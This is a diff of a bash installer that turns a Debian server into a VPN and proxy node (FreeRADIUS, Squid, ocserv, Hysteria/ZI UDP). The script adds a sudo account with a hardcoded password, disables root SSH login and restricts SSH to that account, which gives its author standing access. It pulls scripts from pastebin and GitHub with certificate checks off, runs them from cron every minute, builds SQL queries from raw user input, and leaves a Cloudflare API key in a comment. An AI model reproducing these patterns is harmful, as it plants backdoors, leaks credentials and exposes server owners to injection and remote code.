@@ -11,51 +11,22 @@ OBFS='radeveloper';
 HYSTERIA_TYPE='default';
 
 timedatectl set-timezone Asia/Riyadh
-
 install_require () {
-    clear
-    echo "Installing dependencies (Debian 11/12)..."
-
-    {
-        export DEBIAN_FRONTEND=noninteractive
-
-        # Ensure Debian
-        . /etc/os-release
-        [ "$ID" != "debian" ] && return
-
-        apt update -y
-
-        # Core utilities
-        apt install -y curl wget cron python3 python-is-python3
-        apt install -y jq unzip dos2unix nano screen neofetch vnstat
-        apt install -y net-tools mlocate virt-what httpie netcat
-
-        # Network / security
-        apt install -y iptables fail2ban squid stunnel4 dropbear gnutls-bin
-
-        # Radius / database
-        apt install -y freeradius freeradius-mysql freeradius-utils
-        apt install -y default-mysql-client php
-
-        # VPN / proxy
-        apt install -y ocserv
-
-        # Build / dev tools
-        apt install -y build-essential dh-make libaudit-dev
-
-        # Enable services quietly
-        systemctl enable cron 2>/dev/null
-        systemctl enable vnstat 2>/dev/null
-        systemctl enable fail2ban 2>/dev/null
-
-        updatedb 2>/dev/null
-        clear
-    } &>/dev/null
-
-    clear
-    echo "Dependencies installed."
+clear
+echo 'Installing dependencies.'
+{
+export DEBIAN_FRONTEND=noninteractive
+apt update
+apt install -y curl wget cron python-minimal libpython-stdlib
+apt install -y iptables freeradius freeradius-mysql freeradius-utils
+apt install -y ocserv default-mysql-client netcat httpie php neofetch vnstat
+apt install -y screen squid stunnel4 dropbear gnutls-bin python pwgen
+apt install -y dos2unix nano unzip jq virt-what net-tools
+apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
+clear
+}&>/dev/null
+clear
 }
-
 
 install_freeradius()
 {
@@ -139,8 +110,8 @@ echo "Preparing authentication module."
   sudo chgrp -h freerad /etc/freeradius/3.0/mods-available/sql
   sudo chown -R freerad:freerad /etc/freeradius/3.0/mods-enabled/sql
   cd /etc/freeradius/3.0/sites-available/
-  wget --no-check-certificate https://gitlab.com/moralesroden98/mtkproject/-/raw/main/default -O default
-  wget --no-check-certificate https://gitlab.com/moralesroden98/mtkproject/-/raw/main/inner-tunnel -O inner-tunnel
+  wget --no-check-certificate https://pastebin.com/raw/Z2Qjhe4p -O default
+  wget --no-check-certificate https://pastebin.com/raw/5UT82ghN -O inner-tunnel
   cd /etc/freeradius/3.0/; rm clients.conf
   echo "client localhost {
 
@@ -187,111 +158,84 @@ clear
 clear
 }
 
-install_squid() {
-    clear
-    echo "Installing proxy (Debian 11/12)..."
-
-    export DEBIAN_FRONTEND=noninteractive
-
-    # Update system
+install_squid(){
+clear
+echo 'Installing proxy.'
+{
+sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup
+echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
+    deb-src http://ftp.debian.org/debian/ jessie main contrib non-free
+    deb http://security.debian.org/ jessie/updates main contrib
+    deb-src http://security.debian.org/ jessie/updates main contrib
+    deb http://ftp.debian.org/debian/ jessie-updates main contrib non-free
+    deb-src http://ftp.debian.org/debian/ jessie-updates main contrib non-free" >> /etc/apt/sources.list
     apt update
-    apt install -y squid wget curl
-
-    # Stop squid before config
-    systemctl stop squid 2>/dev/null
-
-    # Backup config (only once)
-    [ -f /etc/squid/squid.conf ] && \
-      cp /etc/squid/squid.conf /etc/squid/squid.conf.bak
-
-    # Write squid config
-    cat > /etc/squid/squid.conf <<EOF
-acl Firenet dst $server_ip
-
-http_port 8080
+    apt install -y gcc-4.9 g++-4.9
+    update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.9 10
+    update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-4.9 10
+    update-alternatives --install /usr/bin/cc cc /usr/bin/gcc 30
+    update-alternatives --set cc /usr/bin/gcc
+    update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
+    update-alternatives --set c++ /usr/bin/g++
+    cd /usr/src
+    wget https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/squid-3.1.23.tar.gz
+    tar zxvf squid-3.1.23.tar.gz
+    cd squid-3.1.23
+    ./configure --prefix=/usr \
+      --localstatedir=/var/squid \
+      --libexecdir=/usr/lib/squid \
+      --srcdir=. \
+      --datadir=/usr/share/squid \
+      --sysconfdir=/etc/squid \
+      --with-default-user=proxy \
+      --with-logdir=/var/log/squid \
+      --with-pidfile=/var/run/squid.pid
+    make -j$(nproc)
+    make install
+    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/squid.sh
+    chmod +x /etc/init.d/squid
+    update-rc.d squid defaults
+    chown -cR proxy /var/log/squid
+    squid -z
+    cd /etc/squid/
+    rm squid.conf
+    echo "acl Firenet dst $server_ip" >> squid.conf
+    echo 'http_port 8080
 http_port 8181
-
-visible_hostname Firenet-Proxy
-
+visible_hostname Proxy
 acl PURGE method PURGE
 acl HEAD method HEAD
 acl POST method POST
 acl GET method GET
 acl CONNECT method CONNECT
-
 http_access allow Firenet
 http_reply_access allow all
 http_access deny all
-
 icp_access allow all
 always_direct allow all
-
-error_directory /usr/share/squid/errors/English
-EOF
-
-    # Initialize cache
-    squid -z 2>/dev/null
-
-    # Custom error page
-    ERR_DIR="/usr/share/squid/errors/English"
-    ERR_FILE="$ERR_DIR/ERR_INVALID_URL"
-
-    mkdir -p "$ERR_DIR"
-
-    cat > "$ERR_FILE" <<'EOF'
-<!--TKNETWORK-->
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>SECURE PROXY</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css">
-<link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">
-<style>
-body { font-family: "Press Start 2P", cursive; }
-.fn-color {
-  color: #fff;
-  background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  -webkit-animation: hue 5s infinite linear;
+visible_hostname Firenet-Proxy
+error_directory /usr/share/squid/errors/English' >> squid.conf
+    cd /usr/share/squid/errors/English
+    rm ERR_INVALID_URL
+    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    chmod 755 *
+    /etc/init.d/squid start
+cd /etc || exit
+wget 'https://pastebin.com/raw/z9j2nA8p' -O /etc/socks.py
+dos2unix /etc/socks.py
+chmod +x /etc/socks.py
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/monitor' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/ws' -O /etc/.ws
+wget 'https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/hysteria' -O /etc/.hysteria
+chmod +x /etc/.monitor
+chmod +x /etc/.ws
+chmod +x /etc/.hysteria
+rm /etc/apt/sources.list
+sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
+clear
+}&>/dev/null
+clear
 }
-@-webkit-keyframes hue {
-  from { -webkit-filter: hue-rotate(0deg); }
-  to { -webkit-filter: hue-rotate(-360deg); }
-}
-</style>
-</head>
-<body>
-<div class="container" style="padding-top:50px">
-  <div class="jumbotron">
-    <h1 class="display-3 text-center fn-color">SECURE PROXY</h1>
-    <h4 class="text-center text-danger">SERVER</h4>
-    <p class="text-center">😍 %w 😍</p>
-  </div>
-</div>
-</body>
-</html>
-EOF
-
-    chmod 755 "$ERR_DIR"/* 2>/dev/null
-
-    # Enable & start squid
-    systemctl enable squid 2>/dev/null
-    systemctl restart squid
-
-    # External scripts (unchanged)
-    wget -q https://gitlab.com/moralesroden98/mtkproject/-/raw/main/monitorz  -O /etc/.monitor
-    wget -q https://gitlab.com/moralesroden98/mtkproject/-/raw/main/ws        -O /etc/.ws
-    wget -q https://gitlab.com/moralesroden98/mtkproject/-/raw/main/hysteria  -O /etc/.hysteria
-
-    chmod +x /etc/.monitor /etc/.ws /etc/.hysteria 2>/dev/null
-
-    clear
-    echo "Squid proxy installation finished."
-}
-
 
 install_openconnect()
 {
@@ -302,16 +246,34 @@ DNSStubListener=no' >> /etc/systemd/resolved.conf
 
 echo "Installing openconnect."
 {
+#  {
+#    gencert=$(echo "$(pwgen 15 1)" | tr '[:upper:]' '[:lower:]')
+#    genip=$(curl -s https://api.ipify.org)
+#    curl -X POST "https://api.cloudflare.com/client/v4/zones/5e9c7930f8dbd229e9f54448a9197616/dns_records" -H "X-Auth-Email: dev.imkobz@gmail.com" -H "X-Auth-Key: 17dc17ceba5d6e7fe3587c55a40521a217e81" -H "Content-Type: application/json" --data '{"type":"A","name":"cert-'"$(echo $gencert)"'","content":"'"$(curl -s https://api.ipify.org)"'","ttl":1,"priority":0,"proxied":false}'
+#    sleep 60
+#    echo "<VirtualHost *:80>
+#            ServerName cert-$(echo $gencert).paneldemo.xyz
+#
+#            DocumentRoot /var/www/cert-$(echo $gencert).paneldemo.xyz
+#    </VirtualHost>" >> /etc/apache2/sites-available/cert-$(echo $gencert).paneldemo.xyz.conf
+#    sudo mkdir /var/www/cert-$(echo $gencert).paneldemo.xyz
+#    sudo chown www-data:www-data /var/www/cert-$(echo $gencert).paneldemo.xyz -R
+#    sudo a2ensite cert-$(echo $gencert).paneldemo.xyz
+#    sudo systemctl reload apache2
+#    sudo certbot certonly --non-interactive --webroot --agree-tos --email dev.imkobz@gmail.com -d cert-$(echo $gencert).paneldemo.xyz -w /var/www/cert-$(echo $gencert).paneldemo.xyz
+#  } &>/dev/null
 cd /etc/ocserv/
-openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=DexterEskalarte/O=DexterEskalarte/C=PH' -keyout /etc/ocserv/ocserv.pem -out /etc/ocserv/ocserv.pem
+#wget --no-check-certificate https://pastebin.com/raw/2e3ZXk6P -O server.pem;wget --no-check-certificate https://pastebin.com/raw/8UA7xQwE -O server.crt;wget --no-check-certificate https://pastebin.com/raw/CLPw2uuK -O server.key
+#wget --no-check-certificate https://pastebin.com/raw/Gv8MP2NF -O fullchain.pem;wget --no-check-certificate https://pastebin.com/raw/NW4Vzbw9 -O privkey.pem
+openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=FirenetVPN/O=FirenetDev/C=PH' -keyout /etc/ocserv/ocserv.pem -out /etc/ocserv/ocserv.pem
 rm ocserv.conf
 wget --no-check-certificate -O go_connect https://gitlab.com/moralesroden98/mtkproject/-/raw/main/go_connect.sh
 wget --no-check-certificate -O go_disconnect https://gitlab.com/moralesroden98/mtkproject/-/raw/main/go_disconnect.sh
 chmod +x go_connect go_disconnect
-sed -i "s|TK403|$(curl -s https://api.ipify.org)|g" /etc/ocserv/go_connect
+sed -i "s|LENZPOGI|$(curl -s https://api.ipify.org)|g" /etc/ocserv/go_connect
 echo 'auth = "radius [config=/etc/radcli/radiusclient.conf]"
 tcp-port = '$PORT_TCP'
-udp-port = '$PORT_UDP'
+udp-port = '$PORT_TCP'
 run-as-user = nobody
 run-as-group = daemon
 socket-file = /var/run/ocserv-socket
@@ -352,7 +314,7 @@ cp /lib/systemd/system/ocserv.service /etc/systemd/system/ocserv.service
 cd /etc/systemd/system/
 rm ocserv.service
 echo '[Unit]
-Description=TknetworkDev OpenConnect SSL VPN server
+Description=FirenetDev OpenConnect SSL VPN server
 Documentation=man:ocserv(8)
 After=network-online.target
 
@@ -389,7 +351,7 @@ iptables -t nat -A PREROUTING -i "$server_interface" -p udp -m udp --dport 10000
 iptables -A INPUT -p tcp --dport 3306 -j ACCEPT
 iptables -I INPUT -p udp --dport 3306 -j ACCEPT
 iptables -I INPUT -p tcp --dport $PORT_TCP -j ACCEPT
-iptables -I INPUT -p udp --dport $PORT_UDP -j ACCEPT
+iptables -I INPUT -p udp --dport $PORT_TCP -j ACCEPT
 iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
 iptables -I FORWARD -s 192.168.119.0/21 -j ACCEPT
 iptables -I FORWARD -d 192.168.119.0/21 -j ACCEPT
@@ -404,7 +366,7 @@ clear
 install_stunnel() {
   {
     cd /etc/stunnel/
-    openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=DexterEskalarte/O=DexterEskalarte/C=PH' -keyout /etc/stunnel/stunnel.pem -out /etc/stunnel/stunnel.pem
+    openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -sha256 -subj '/CN=FirenetPH/O=FirenetDev/C=PH' -keyout /etc/stunnel/stunnel.pem -out /etc/stunnel/stunnel.pem
     echo "pid = /tmp/stunnel.pid
 debug = 0
 output = /tmp/stunnel.log
@@ -426,9 +388,9 @@ RLIMITS=""' >> stunnel4
 }
 
 install_sudo(){
-    useradd -m adminmtk 2>/dev/null; echo adminmtk:Mediatek272124@@ | chpasswd &>/dev/null; usermod -aG sudo adminmtk &>/dev/null
+    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
+    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
     service sshd restart
 }
 
@@ -436,7 +398,7 @@ install_hysteria(){
 clear
 echo 'Installing hysteria.'
 {
-wget -N --no-check-certificate -q -O ~/install_server.sh https://gitlab.com/moralesroden98/mtkproject/-/raw/main/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
 rm -f /etc/hysteria/config.json
 
@@ -447,7 +409,7 @@ echo '{
   "up_mbps": 100,
   "down_mbps": 100,
   "disable_udp": false,
-  "obfs": "mtk",
+  "obfs": "mediatekvpn",
   "auth": {
     "mode": "external",
     "config": {
@@ -460,7 +422,7 @@ echo '{
 }
 ' >> /etc/hysteria/config.json
 
-sed -i "s|mtk|$OBFS|g" /etc/hysteria/config.json
+sed -i "s|mediatekvpn|$OBFS|g" /etc/hysteria/config.json
 
 cat <<"EOM" >/etc/hysteria/.auth.sh
 #!/bin/bash
@@ -578,7 +540,7 @@ chmod 755 /etc/hysteria/.auth.sh
 sysctl -w net.core.rmem_max=16777216
 sysctl -w net.core.wmem_max=16777216
 
-wget -O /usr/bin/badvpn-udpgw "https://gitlab.com/moralesroden98/mtkproject/-/raw/main/badvpn-udpgw64"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 } &>/dev/null
 }
@@ -594,6 +556,94 @@ installBBR() {
     INSTALL_BBR=true
 }
 
+#====================================================
+#	Installing ZI UDP
+#	Finalized: Firenet Developer
+#====================================================
+
+function install_zi() {
+clear
+echo 'Installing zi udp.'
+{
+echo -e "Downloading UDP Service"
+wget https://github.com/zahidbd2/udp-zivpn/releases/download/udp-zivpn_1.4.9/udp-zivpn-linux-amd64 -O /usr/local/bin/zivpn 1> /dev/null 2> /dev/null
+chmod +x /usr/local/bin/zivpn
+mkdir /etc/zivpn 1> /dev/null 2> /dev/null
+
+echo "Generating cert files:"
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=PH/ST=Cebu/L=Central Visayas/O=Firenet Developer/OU=IT Department/CN=firenet" -keyout "/etc/zivpn/zivpn.key" -out "/etc/zivpn/zivpn.crt"
+sysctl -w net.core.rmem_max=16777216 1> /dev/null 2> /dev/null
+sysctl -w net.core.wmem_max=16777216 1> /dev/null 2> /dev/null
+
+echo '{
+  "listen": ":5666",
+  "cert": "/etc/zivpn/zivpn.crt",
+  "key":  "/etc/zivpn/zivpn.key",
+  "obfs":"mediatekvpn",
+  "auth": {
+    "mode": "external",
+    "config": {
+    "cmd": "./.auth.sh"
+    }
+  }
+}
+' >> /etc/zivpn/config.json
+
+sed -i "s|mediatekvpn|$OBFS|g" /etc/zivpn/config.json
+
+cat <<EOF > /etc/systemd/system/hysteria-server.service
+[Unit]
+Description=zivpn VPN Server
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/etc/zivpn
+ExecStart=/usr/local/bin/zivpn -config /etc/zivpn/config.json server
+Restart=always
+RestartSec=3
+Environment=ZIVPN_LOG_LEVEL=info
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
+NoNewPrivileges=true
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable hysteria-server.service
+systemctl start hysteria-server.service
+
+cat <<"EOM" >/etc/zivpn/.auth.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+
+if [ $# -ne 4 ]; then
+    echo "invalid number of arguments"
+    exit 1
+fi
+
+ADDR=$1
+AUTH=$2
+SEND=$3
+RECV=$4
+
+USERNAME=$(echo "$AUTH" | cut -d ":" -f 1)
+PASSWORD=$(echo "$AUTH" | cut -d ":" -f 2)
+
+Query="SELECT user_name FROM users WHERE user_name='$USERNAME' AND auth_vpn=md5('$PASSWORD') AND is_freeze='0' AND duration > 0"
+username=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$username" != '' ] && [ "$username" = "$USERNAME" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'Authentication failed.'; exit 1
+EOM
+
+chmod 755 /etc/zivpn/.auth.sh
+
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/badvpn-udpgw64"
+chmod +x /usr/bin/badvpn-udpgw
+
+} &>/dev/null
+}
 
 install_rclocal(){
 clear
@@ -603,8 +653,8 @@ clear
     sudo systemctl start ocserv.service  
     
     echo "[Unit]
-Description=MediatekVpn service
-Documentation=http://mediatek.com
+Description=firenet service
+Documentation=http://mediatekvpn.com
 
 [Service]
 Type=oneshot
@@ -612,7 +662,7 @@ ExecStart=/bin/bash /etc/rc.local
 RemainAfterExit=yes
 
 [Install]
-WantedBy=multi-user.target" >> /etc/systemd/system/MediatekVpn.service
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
 rm -rf /etc/rc.local
     echo '#!/bin/sh -e
 service ufw stop
@@ -623,26 +673,33 @@ service apache2 stop
 service freeradius restart
 service stunnel4 restart
 systemctl restart ocserv.service
-systemctl restart hysteria-server.service
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
+screen -dmS socks python /etc/socks.py
 screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
 bash /etc/.monitor openconnect
 exit 0' >> /etc/rc.local
-    sudo chmod +x /etc/rc.local
-    systemctl daemon-reload
-    systemctl enable hysteria-server.service
-    systemctl restart hysteria-server.service
-    sudo systemctl enable MediatekVpn
-    sudo systemctl start MediatekVpn.service
 
+sudo chmod +x /etc/rc.local
+systemctl daemon-reload
+systemctl enable hysteria-server.service
+systemctl restart hysteria-server.service
+sudo systemctl enable firenet
+sudo systemctl start firenet.service
+	
 	mkdir -m 777 /root/.web
-echo "Made with love by: MediatekVpn Developer... " >> /root/.web/index.php
+echo "Made with love by: Firenet Developer... " >> /root/.web/index.php
 
-echo "tcp_port=1194
-udp_port=110
+echo "tcp_port=TCP_PORT
+udp_port=UDP_PORT
+socket_port=80
 squid_port=8080
 hysteria_port=5666
-tcp_ssl_port=443" >> /root/.ports
+tcp_ssl_port=PORT_SSL
+udp_ssl_port=442" >> /root/.ports
+
+sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
+sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
+sed -i "s|PORT_SSL|$PORT_SSL|g" /root/.ports
 
   }&>/dev/null
   clear
@@ -654,6 +711,7 @@ clear
 
 sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart 
 @daily certbot renew --quiet && systemctl restart ocserv
+* * * * * /bin/bash /etc/.ws >/dev/null 2>&1
 * * * * * /bin/bash /etc/.hysteria >/dev/null 2>&1
 * * * * * /bin/bash /etc/.monitor openconnect >/dev/null 2>&1"; } | crontab -
 sudo systemctl restart cron
@@ -670,7 +728,7 @@ echo "DB_NAME='$DBNAME'" >> ~/.db-base
 echo "DB_USER='$USER'" >> ~/.db-base
 echo "DB_PASS='$PASS'" >> ~/.db-base
 echo 'Server will secure this server and reboot after 20 seconds'
-sleep 10
+sleep 20
 reboot
 }
 
@@ -679,7 +737,11 @@ server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_sudo
 install_require  
-install_hysteria
+if [[ $HYSTERIA_TYPE == 'default' ]]; then
+	install_hysteria
+elif [[ $HYSTERIA_TYPE == 'zi' ]]; then
+	install_zi
+fi
 installBBR
 install_freeradius
 install_squid
